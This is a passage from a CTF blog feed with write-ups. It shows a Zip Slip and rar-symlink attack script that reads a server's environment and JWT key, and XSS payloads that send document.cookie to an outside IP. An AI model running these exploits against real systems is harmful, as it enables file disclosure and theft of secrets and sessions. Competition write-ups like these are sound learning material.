class="number">1024</span> * <span class="number">1024</span></span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">decrypt_file</span>(<span class="params"></span></span><br><span class="line"><span class="params">    data: UploadFile = Body(<span class="params">media_type=<span class="string">&quot;multipart/form-data&quot;</span></span>),</span></span><br><span class="line"><span class="params"></span>) -&gt; <span class="built_in">dict</span>[<span class="built_in">str</span>, <span class="built_in">str</span>]:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    We can decrypt some txt file in a compressed file</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    filename = data.filename</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> check_file_type(filename):</span><br><span class="line">        <span class="keyword">return</span> &#123;<span class="string">&quot;code&quot;</span>: <span class="number">40000</span>, <span class="string">&quot;msg&quot;</span>: <span class="string">&quot;Invalid file type&quot;</span>&#125;</span><br><span class="line">    content = <span class="keyword">await</span> data.read()</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">with</span> NamedTemporaryFile(mode=<span class="string">&quot;wb&quot;</span>, suffix=filename) <span class="keyword">as</span> tmp:</span><br><span class="line">            tmp.write(content)</span><br><span class="line">            tmp.seek(<span class="number">0</span>)</span><br><span class="line">            <span class="keyword">return</span> uncompress_file(tmp.name, converter.decrypt_string)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">return</span> &#123;<span class="string">&quot;code&quot;</span>: <span class="number">50000</span>, <span class="string">&quot;msg&quot;</span>: <span class="string">f&quot;Encrypt file error: <span class="subst">&#123;e&#125;</span>&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@post(<span class="params"><span class="string">f&quot;/api/admin/upgrade/<span class="subst">&#123;uuid4().<span class="built_in">hex</span>&#125;</span>&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">upgrade</span>(<span class="params">headers: <span class="built_in">dict</span></span>) -&gt; <span class="built_in">dict</span>[<span class="built_in">str</span>, <span class="built_in">str</span>]:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Only admin can do!</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    token = headers.get(<span class="string">&quot;r3-token&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> token:</span><br><span class="line">        <span class="keyword">return</span> &#123;<span class="string">&quot;code&quot;</span>: <span class="number">40300</span>, <span class="string">&quot;msg&quot;</span>: <span class="string">&quot;Authentication Failed&quot;</span>&#125;</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> jwt.decode(token, JWT_KEY, algorithms=[<span class="string">&quot;HS256&quot;</span>]).get(<span class="string">&quot;role&quot;</span>) != <span class="string">&quot;admin&quot;</span>:</span><br><span class="line">            <span class="keyword">return</span> &#123;<span class="string">&quot;code&quot;</span>: <span class="number">40300</span>, <span class="string">&quot;msg&quot;</span>: <span class="string">&quot;Permission Denied&quot;</span>&#125;</span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line">        <span class="keyword">return</span> &#123;<span class="string">&quot;code&quot;</span>: <span class="number">40300</span>, <span class="string">&quot;msg&quot;</span>: <span class="string">&quot;Authentication Error&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        ret = (</span><br><span class="line">            check_output(</span><br><span class="line">                [<span class="string">&quot;/app/upgrade.sh&quot;</span>],</span><br><span class="line">                env=<span class="literal">None</span>,</span><br><span class="line">                universal_newlines=<span class="literal">True</span>,</span><br><span class="line">                timeout=<span class="number">60</span>,</span><br><span class="line">                user=<span class="string">&quot;r3ctf&quot;</span>,</span><br><span class="line">            )</span><br><span class="line">            .strip()</span><br><span class="line">            .replace(<span class="string">&quot;\n&quot;</span>, <span class="string">&quot;, &quot;</span>)</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">        reload(pigsay)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">global</span> converter</span><br><span class="line">        converter = pigsay.PigConverter(PIG_KEY)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> &#123;<span class="string">&quot;code&quot;</span>: <span class="number">20000</span>, <span class="string">&quot;msg&quot;</span>: <span class="string">&quot;Upgrade successfully&quot;</span>, <span class="string">&quot;data&quot;</span>: ret&#125;</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">return</span> &#123;<span class="string">&quot;code&quot;</span>: <span class="number">50000</span>, <span class="string">&quot;msg&quot;</span>: <span class="string">&quot;Upgrade failed&quot;</span>, <span class="string">&quot;data&quot;</span>: <span class="built_in">str</span>(e)&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app = Litestar(</span><br><span class="line">    route_handlers=[</span><br><span class="line">        ping,</span><br><span class="line">        encrypt,</span><br><span class="line">        decrypt,</span><br><span class="line">        encrypt_file,</span><br><span class="line">        decrypt_file,</span><br><span class="line">        upgrade,</span><br><span class="line">        create_static_files_router(path=<span class="string">&quot;/static&quot;</span>, directories=[<span class="string">&quot;static&quot;</span>]),</span><br><span class="line">        create_static_files_router(path=<span class="string">&quot;/&quot;</span>, directories=[<span class="string">&quot;public&quot;</span>], html_mode=<span class="literal">True</span>),</span><br><span class="line">    ],</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">uvicorn.run(app, host=<span class="string">&quot;0.0.0.0&quot;</span>, port=<span class="number">8000</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><code>extractall()</code>没有路径验证，典型的Zip Slip漏洞，看到会执行<code>/app/upgrade.sh</code>，所以目的就是覆盖这个，然后jwt伪造，再执行即可。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> zipfile</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> zipfile.ZipFile(<span class="string">&quot;exploit.zip&quot;</span>, <span class="string">&quot;w&quot;</span>) <span class="keyword">as</span> zf:</span><br><span class="line">    zf.writestr(<span class="string">&quot;../../../../../../../../../../../app/upgrade.sh&quot;</span>, <span class="string">&quot;#!/bin/bash\npwd &gt; /tmp/1.txt\n&quot;</span>)</span><br><span class="line">    zf.writestr(<span class="string">&quot;unique_flag_123456.txt&quot;</span>, <span class="string">&quot;I was here&quot;</span>)</span><br></pre></td></tr></table></figure><p>但是并没有成功，发现python版本非常高，<a href="https://github.com/python/cpython/pulls?q=is:pr+zipfile+path+traversal+is:closed">https://github.com/python/cpython/pulls?q=is%3Apr+zipfile+path+traversal+is%3Aclosed</a>   所以是被过滤了，暂时想不到什么办法来解决了，目录也要爆破TM的</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> uuid <span class="keyword">import</span> uuid4</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    uuid = uuid4().<span class="built_in">hex</span></span><br><span class="line">    url = <span class="string">f&quot;http://baozongwi.suer.cc:8000/api/admin/upgrade/<span class="subst">&#123;uuid&#125;</span>&quot;</span></span><br><span class="line">    r = requests.get(url)</span><br><span class="line">    <span class="keyword">if</span> r.status_code != <span class="number">200</span>:</span><br><span class="line">        <span class="built_in">print</span>(url)</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;right&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(url)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>但是忽略了一点Litestar是默认会生成OpenAI的json在<code>/schema</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/schema/swagger</span><br><span class="line">/schema/redoc</span><br></pre></td></tr></table></figure><p>测试发现rar软连接可以任意文件读取</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">import</span> shutil</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> tempfile</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> pathlib <span class="keyword">import</span> Path</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ensure_rar</span>():</span><br><span class="line">    rar = shutil.which(<span class="string">&quot;rar&quot;</span>) <span class="keyword">or</span> shutil.which(<span class="string">&quot;rar.exe&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> rar:</span><br><span class="line">        <span class="keyword">raise</span> RuntimeError(<span class="string">&quot;未找到 rar CLI&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> rar</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">build_rar_symlink</span>(<span class="params">archive_path, link_name, target</span>):</span><br><span class="line">    rar = ensure_rar()</span><br><span class="line">    <span class="keyword">with</span> tempfile.TemporaryDirectory() <span class="keyword">as</span> tmp:</span><br><span class="line">        t = Path(tmp)</span><br><span class="line">        (t / link_name).symlink_to(target)</span><br><span class="line">        subprocess.run([rar, <span class="string">&quot;a&quot;</span>, <span class="string">&quot;-ol&quot;</span>, <span class="string">&quot;-ep&quot;</span>, archive_path.name, link_name], cwd=t, check=<span class="literal">True</span>)</span><br><span class="line">        shutil.move(t / archive_path.name, archive_path)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">upload_file</span>(<span class="params">file_path</span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(file_path, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        files = &#123;<span class="string">&#x27;data&#x27;</span>: (file_path, f, <span class="string">&#x27;application/x-rar-compressed&#x27;</span>)&#125;</span><br><span class="line">        response = requests.post(<span class="string">&quot;http://baozongwi.suer.cc:8000/api/file/encrypt&quot;</span>, files=files, timeout=<span class="number">30</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;状态码: <span class="subst">&#123;response.status_code&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;响应: <span class="subst">&#123;response.text&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> response.status_code == <span class="number">200</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    ap = argparse.ArgumentParser()</span><br><span class="line">    ap.add_argument(<span class="string">&quot;--target&quot;</span>, default=<span class="string">&quot;/proc/self/environ&quot;</span>)</span><br><span class="line">    ap.add_argument(<span class="string">&quot;--out&quot;</span>, default=<span class="string">&quot;evil.rar&quot;</span>)</span><br><span class="line">    ap.add_argument(<span class="string">&quot;--name&quot;</span>, default=<span class="string">&quot;secret.txt&quot;</span>)</span><br><span class="line">    ap.add_argument(<span class="string">&quot;--no-upload&quot;</span>, action=<span class="string">&quot;store_true&quot;</span>)</span><br><span class="line">    args = ap.parse_args()</span><br><span class="line">    </span><br><span class="line">    build_rar_symlink(Path(args.out), args.name, args.target)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> args.no_upload:</span><br><span class="line">        upload_file(args.out)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>读取到了jwt的密钥</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">FLAG=R3CTF&#123;fake_flag&#125;HOME=/home/r3ctfHOSTNAME=301e80c2861eJWT_KEY=3910903be7054ea38eb9f53e400f3a97LOGNAME=r3ctfPATH=/app/.venv/bin:/usr/local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/binPIG_KEY=a788f4f7d3e24b47bb4afb7ab6516796PWD=/appPYTHON_SHA256=7ac9e84844bbc0a5a8f1f79a37a68b3b8caf2a58b4aa5999c49227cb36e70ea6PYTHON_VERSION=3.14.0b2SHELL=/bin/shSHLVL=2USER=r3ctfUV=/bin/uvUV_RUN_RECURSION_DEPTH=1VIRTUAL_ENV=/app/.venv</span><br></pre></td></tr></table></figure><p>后续是利用CVE-2025-4517写一个假库，即可RCE，原理是<code>/app/upgrade.sh</code>其实本身只执行<code>uv add -U pigsay</code>。我们把这个库覆盖掉即可</p>]]></content>
    
    
    <summary type="html">这比赛要是100分我才应该打的</summary>
    
    
    
    <category term="赛题" scheme="https://baozongwi.xyz/categories/%E8%B5%9B%E9%A2%98/"/>
    
    
    <category term="php" scheme="https://baozongwi.xyz/tags/php/"/>
    
  </entry>
  
  <entry>
    <title>DASCTF2025上半年赛</title>
    <link href="https://baozongwi.xyz/posts/15e4a2fc.html"/>
    <id>https://baozongwi.xyz/posts/15e4a2fc.html</id>
    <published>2025-06-22T05:02:14.000Z</published>
    <updated>2025-08-08T04:00:39.263Z</updated>
    
    <content type="html"><![CDATA[<p>我主要做了phpms，jdbc是队友做的，太强了，不过两题都是临门一脚，棋差一招</p><p><a href="https://su-team.cn/2025/06/21/2025-DASCTF%E4%B8%8A%E5%8D%8A%E5%B9%B4/">https://su-team.cn/2025/06/21/2025-DASCTF%E4%B8%8A%E5%8D%8A%E5%B9%B4/</a></p><p>不想写了，太懒了哈哈，真是绞尽脑汁，做的时候，同时也想到有没有一种情况是可以直接原生类去进攻Redis的呢，SoapClient？SimpleXMLElement？(<del>反正我不会</del>)</p>]]></content>
    
    
    <summary type="html">DAS冠军诶</summary>
    
    
    
    <category term="赛题" scheme="https://baozongwi.xyz/categories/%E8%B5%9B%E9%A2%98/"/>
    
    
    <category term="php" scheme="https://baozongwi.xyz/tags/php/"/>
    
    <category term="jdbc" scheme="https://baozongwi.xyz/tags/jdbc/"/>
    
  </entry>
  
  <entry>
    <title>smileyCTF2025</title>
    <link href="https://baozongwi.xyz/posts/bdbf439.html"/>
    <id>https://baozongwi.xyz/posts/bdbf439.html</id>
    <published>2025-06-14T08:05:06.000Z</published>
    <updated>2025-08-08T04:08:33.243Z</updated>
    
    <content type="html"><![CDATA[<h2 id="web-Sculpture-Revenge"><a href="#web-Sculpture-Revenge" class="headerlink" title="web&#x2F;Sculpture Revenge"></a>web&#x2F;Sculpture Revenge</h2><p>访问用户提供的url，并且还必须是同域名的情况</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">from urllib.parse import urlparse, parse_qs, urlencode, urlunparse</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">parsed = urlparse(&quot;https://google.com&quot;)</span></span><br><span class="line"><span class="string">query_params = parse_qs(parsed.query)</span></span><br><span class="line"><span class="string">query_params[&quot;code&quot;] = &quot;123&quot;</span></span><br><span class="line"><span class="string">new_query = urlencode(query_params, doseq=True)</span></span><br><span class="line"><span class="string">new_url = urlunparse(parsed._replace(query=new_query))</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> urlparse, parse_qs, urlencode, urlunparse</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, make_response, redirect</span><br><span class="line"><span class="keyword">import</span> base64, sys</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> selenium <span class="keyword">import</span> webdriver</span><br><span class="line"><span class="keyword">from</span> selenium.webdriver.chrome.options <span class="keyword">import</span> Options</span><br><span class="line"></span><br><span class="line">flag = <span class="built_in">open</span>(<span class="string">&#x27;flag.txt&#x27;</span>).read().strip()</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">PORT = <span class="number">8802</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> make_response(<span class="built_in">open</span>(<span class="string">&#x27;index.html&#x27;</span>).read())</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/bot&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bot</span>():</span><br><span class="line">    data = request.args.get(<span class="string">&#x27;code&#x27;</span>, <span class="string">&#x27;🍃&#x27;</span>).encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    data = base64.b64decode(data).decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    parsed = urlparse(<span class="string">f&quot;<span class="subst">&#123;request.host_url&#125;</span>&quot;</span>)</span><br><span class="line">    query_params = parse_qs(parsed.query)</span><br><span class="line">    query_params[<span class="string">&quot;code&quot;</span>] = base64.b64encode(data.encode(<span class="string">&#x27;utf-8&#x27;</span>)).decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    new_query = urlencode(query_params, doseq=<span class="literal">True</span>)</span><br><span class="line">    new_url = urlunparse(parsed._replace(query=new_query))</span><br><span class="line">    options = Options()</span><br><span class="line">    options.add_argument(<span class="string">&quot;--headless&quot;</span>)</span><br><span class="line">    options.add_argument(<span class="string">&quot;--no-sandbox&quot;</span>)</span><br><span class="line">    driver = webdriver.Chrome(options=options)</span><br><span class="line">    driver.get(<span class="string">f&#x27;<span class="subst">&#123;request.host_url&#125;</span>void&#x27;</span>)</span><br><span class="line">    driver.add_cookie(&#123;</span><br><span class="line">        <span class="string">&#x27;name&#x27;</span>: <span class="string">&#x27;flag&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;value&#x27;</span>: flag.replace(<span class="string">&quot;.;,;.&#123;&quot;</span>, <span class="string">&quot;&quot;</span>).replace(<span class="string">&quot;&#125;&quot;</span>, <span class="string">&quot;&quot;</span>),</span><br><span class="line">        <span class="string">&#x27;path&#x27;</span>: <span class="string">&#x27;/&#x27;</span>,</span><br><span class="line">    &#125;)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;[+] Visiting &#x27;</span> + new_url, file=sys.stderr)</span><br><span class="line">    driver.get(new_url)</span><br><span class="line">    driver.implicitly_wait(<span class="number">5</span>)</span><br><span class="line">    driver.quit()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;[-] Done visiting URL&#x27;</span>, new_url, file=sys.stderr)</span><br><span class="line">    <span class="keyword">return</span> make_response(<span class="string">&#x27;Bot executed successfully&#x27;</span>, <span class="number">200</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=PORT, debug=<span class="literal">False</span>)</span><br></pre></td></tr></table></figure><p>在Skulpt环境中执行提交的经过base64编码的python代码，同时发现真正的flag，并没有域名限制的访问，</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span> <span class="string">&quot;1&quot;</span></span><br></pre></td></tr></table></figure><p>这样子测试是成功的，对于这个解析器，好像有个payload可以使用</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;&lt;img src=&quot;x&quot; onerror=&quot;alert(114)&quot;&gt;&#x27;</span>)</span><br></pre></td></tr></table></figure><p>但是并没有成功，<code>index.html</code>写到是纯文本，还是自己起docker来测试一下了</p><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">version:</span> <span class="string">&#x27;3.8&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="attr">services:</span></span><br><span class="line">  <span class="attr">sculpture-revenge:</span></span><br><span class="line">    <span class="attr">build:</span> <span class="string">.</span></span><br><span class="line">    <span class="attr">ports:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;8802:8802&quot;</span></span><br><span class="line">    <span class="attr">volumes:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">./flag.txt:/app/flag.txt</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">./app.py:/app/app.py</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">./index.html:/app/index.html</span></span><br><span class="line">    <span class="attr">environment:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">PYTHONDONTWRITEBYTECODE=1</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">PYTHONUNBUFFERED=1</span></span><br><span class="line">    <span class="attr">restart:</span> <span class="string">unless-stopped</span></span><br></pre></td></tr></table></figure><p>A5rZ师傅之前研究过类似的东西，说<code>parsed = urlparse(f&quot;&#123;request.host_url&#125;&quot;)</code>其实是取决于host头，也就是可控的，当我们本地测试的时候确实work</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/?code=dHh1ZDRyY2lxZDhpbG5tbmJhMGh5NWk5dzAycnFnLm9hc3RpZnkuY29t</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>txud4rciqd8ilnmnba0hy5i9w02rqg.oastify.com</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9,en;q=0.8</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>keep-alive</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>即可收到flag，但是远程并不成功，后来询问师傅得知可以使用document去创建一个在线的标签</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> document</span><br><span class="line"></span><br><span class="line">img = document.createElement(<span class="string">&quot;img&quot;</span>)</span><br><span class="line">img.setAttribute(<span class="string">&quot;src&quot;</span>, <span class="string">&quot;x&quot;</span>)</span><br><span class="line">img.setAttribute(<span class="string">&quot;onerror&quot;</span>, <span class="string">&quot;fetch(&#x27;http://156.238.233.93:9999/&#x27; + document.cookie)&quot;</span>)</span><br><span class="line">document.getElementById(<span class="string">&quot;output&quot;</span>).appendChild(img)</span><br></pre></td></tr></table></figure><p>本地成功远程不成功，可能是跨域的问题，换成</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> document</span><br><span class="line"></span><br><span class="line">img = document.createElement(<span class="string">&quot;img&quot;</span>)</span><br><span class="line">img.setAttribute(<span class="string">&quot;src&quot;</span>, <span class="string">&quot;x&quot;</span>)</span><br><span class="line">img.setAttribute(<span class="string">&quot;onerror&quot;</span>, <span class="string">&quot;window.location.href(&#x27;http://156.238.233.93:9999/&#x27; + document.cookie)&quot;</span>)</span><br><span class="line">document.getElementById(<span class="string">&quot;output&quot;</span>).appendChild(img)</span><br></pre></td></tr></table></figure><h2 id="misc-TI-1983"><a href="#misc-TI-1983" class="headerlink" title="misc&#x2F;TI-1983"></a>misc&#x2F;TI-1983</h2><p>反而我认为这题更像是web，来看看简单的代码吧</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, send_file</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> tempfile</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line">app = Flask(__name__, static_folder=<span class="literal">None</span>)</span><br><span class="line">code_tmpl = <span class="built_in">open</span>(<span class="string">&quot;code_tmpl.py&quot;</span>).read()</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">open</span>(<span 